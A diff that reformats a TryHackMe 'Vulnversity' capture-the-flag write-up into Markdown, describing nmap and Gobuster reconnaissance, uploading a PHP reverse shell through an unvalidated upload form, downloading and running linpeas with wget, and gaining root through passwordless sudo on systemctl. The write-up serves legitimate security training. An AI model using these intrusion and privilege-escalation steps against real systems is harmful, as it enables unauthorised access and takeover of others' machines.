@@ -1,50 +1,41 @@
-#TryHackMe: "Vulnversity" Challenge Writeup
-#Objective:
+# TryHackMe: "Vulnversity" Challenge Writeup
 
+## Objective:
 Find and exploit vulnerabilities in a web server and escalate privileges to root.
 
-#Step 1: Initial Recon with nmap
+## Step 1: Initial Recon with nmap
+- Started with a comprehensive port scan:
+    ```bash
+    nmap -A -T4 <target_ip>
+    ```
+- Discovered ports 80 (HTTP), 22 (SSH), and 139/445 (SMB) open.
+- Focused on port 80 to identify web-based vulnerabilities.
 
--Started with a comprehensive port scan:
+## Step 2: Web Enumeration
+- Used Gobuster to brute force directories on the web server:
+    ```bash
+    gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+    ```
+- Discovered an upload directory.
 
-    'bash
-    'nmap -A -T4 <target_ip>
+## Step 3: Exploiting File Upload
+- The upload form did not properly validate file types, allowing me to upload a PHP reverse shell (php-reverse-shell.php).
+- Triggered the reverse shell by accessing the uploaded file in the browser.
 
--Discovered ports 80 (HTTP), 22 (SSH), and 139/445 (SMB) open.
--Focused on port 80 to identify web-based vulnerabilities.
+## Step 4: Privilege Escalation
+- After gaining a foothold, used linpeas to enumerate the system and check for possible privilege escalation vectors:
+    ```bash
+    wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+    chmod +x linpeas.sh
+    ./linpeas.sh
+    ```
+- Discovered that the user could run sudo on /bin/systemctl without a password.
+- Exploited this to spawn a root shell:
+    ```bash
+    sudo systemctl
+    !/bin/sh
+    ```
 
-#tep 2: Web Enumeration
-
--Used Gobuster to brute force directories on the web server:
-
-    'bash
-    'gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-
--Discovered an upload directory.
-
-#Step 3: Exploiting File Upload
-
--The upload form did not properly validate file types, allowing me to upload a PHP reverse shell (php-reverse-shell.php).
--Triggered the reverse shell by accessing the uploaded file in the browser.
-
-#Step 4: Privilege Escalation
-
--After gaining a foothold, used linpeas to enumerate the system and check for possible privilege escalation vectors:
-
-'bash
-'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
-'chmod +x linpeas.sh
-'./linpeas.sh
-
--Discovered that the user could run sudo on /bin/systemctl without a password.
-
--Exploited this to spawn a root shell:
-
-    'bash
-    'sudo systemctl
-    '!/bin/sh
-
-#Lessons Learned:
-
--Web-based vulnerabilities like unrestricted file uploads can lead to full system compromise.
--Misconfigured sudo permissions offer an easy privilege escalation path.
+## Lessons Learned:
+- Web-based vulnerabilities like unrestricted file uploads can lead to full system compromise.
+- Misconfigured sudo permissions offer an easy privilege escalation path.
